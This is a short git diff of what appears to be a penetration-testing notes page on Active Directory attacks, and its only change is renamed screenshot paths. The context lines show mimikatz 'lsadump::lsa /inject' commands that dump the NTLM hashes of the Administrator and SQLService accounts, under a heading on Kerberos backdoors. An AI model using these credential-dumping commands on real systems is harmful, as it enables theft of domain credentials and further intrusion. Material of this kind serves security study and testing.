@@ -275,7 +275,7 @@ NTLM hash of Administrator
 lsadump::lsa /inject /name:Administrator 
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (2) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 NTLM hash of SQLService
 
@@ -283,7 +283,7 @@ NTLM hash of SQLService
 lsadump::lsa /inject /name:SQLService 
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Kerberos Backdoors w/ mimikatz
 
